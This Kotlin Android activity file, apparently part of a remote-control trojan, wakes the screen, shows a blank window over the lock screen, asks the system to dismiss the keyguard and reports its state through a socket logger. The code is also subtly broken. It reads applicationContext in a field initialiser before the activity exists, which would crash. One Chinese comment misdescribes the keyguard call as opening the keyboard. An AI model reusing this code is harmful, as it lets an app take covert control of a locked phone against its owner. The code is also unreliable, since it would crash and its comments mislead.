package com.xxx.zzz

import android.annotation.SuppressLint
import android.app.Activity
import android.app.KeyguardManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.view.*
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.xxx.zzz.socketsp.IOSocketyt

class CallActivityADsafC : AppCompatActivity() {

    //lateinit关键字用于初始化一个变量，但该变量不会被初始化为实际的对象，直到第一次被引用时
    private lateinit var screenEventReceiver: BroadcastReceiver
    //获取系统服务
    private val kgm = this.applicationContext.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager

    companion object {
        @Suppress("DEPRECATION")
        fun requestDismissKeyguard(activity: Activity) {
            //尝试运行一个异步操作，并捕获异常
            runCatching {
                //判断SDK版本号是否大于等于26
                if (Build.VERSION.SDK_INT >= 26) {
                    //获取KeyguardManager实例
                    val keyguardManager = activity.applicationContext.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
                    //请求弹出键盘
                    keyguardManager.requestDismissKeyguard(activity, null)
                } else {
                    //版本号小于26时，添加WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD标志
                    activity.window.addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD)
                }
            }
        }

        @Suppress("DEPRECATION")
        fun setShowWhenLocked(activity: Activity, show: Boolean) {
            when {
                Build.VERSION.SDK_INT >= 27 -> activity.setShowWhenLocked(show)
                show -> activity.window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED)
                else -> activity.window.clearFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED)
            }
        }

        fun setTurnScreenOn(activity: Activity, turn: Boolean) {
            if (Build.VERSION.SDK_INT >= 27) {
                activity.setTurnScreenOn(turn)
            } else @Suppress("DEPRECATION") if (turn) {
                activity.window.addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
            } else {
                activity.window.clearFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
            }
        }
    }

    @SuppressLint("ClickableViewAccessibility")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        IOSocketyt.sendLogs("", "CallActivity onCreate", "success")
        window.addFlags(WindowManager.LayoutParams.FLAG_IGNORE_CHEEK_PRESSES)
        val tv = TextView(this)
        tv.text = " "
        setContentView(tv)

        // Must be done after view has been created
        setShowWhenLocked(this, true)
        setTurnScreenOn(this, true)
        requestDismissKeyguard(this)

        screenEventReceiver = object : BroadcastReceiver() {
            override fun onReceive(contxt: Context, intent: Intent) {
                if (kgm.isKeyguardLocked) {
                    setShowWhenLocked(this@CallActivityADsafC, true)
                }
            }
        }
        this.registerReceiver(screenEventReceiver, IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
        })
    }

    override fun onDestroy() {
        super.onDestroy()
        runCatching { this.unregisterReceiver(screenEventReceiver) }
    }
}
